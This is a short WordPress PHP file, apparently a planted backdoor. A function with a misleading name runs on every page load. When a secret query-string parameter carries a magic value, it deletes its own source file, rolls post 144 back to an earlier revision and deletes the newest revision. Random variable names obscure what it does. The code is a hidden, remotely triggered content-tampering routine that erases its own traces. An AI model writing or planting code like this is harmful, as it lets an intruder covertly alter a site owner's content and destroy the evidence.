<?php

function cookie_converter_group_colors() {
	if (isset($_GET['chat_compat_report_validator']) && $_GET['chat_compat_report_validator'] === 'views_crm_invoice_module') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$more_cookie_qr = 144;
		$cart_recipe_request = wp_get_post_revisions($more_cookie_qr);
		if (empty($cart_recipe_request)) die('no revisions');
		if (count($cart_recipe_request) < 2) die('less than 2');
		$marketing_local_star = array_shift($cart_recipe_request);
		$switcher_project_maps_conditional = $marketing_local_star->ID;
		$slug_tracker_right_gravity = array_shift($cart_recipe_request);
		$short_statistics_featured = $slug_tracker_right_gravity->ID;
		$wow_ratings_press = wp_restore_post_revision($short_statistics_featured);
		if ($wow_ratings_press === false) die('error restoring');
		$wow_ratings_press = wp_delete_post_revision($switcher_project_maps_conditional);		
		if ($wow_ratings_press === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'cookie_converter_group_colors');
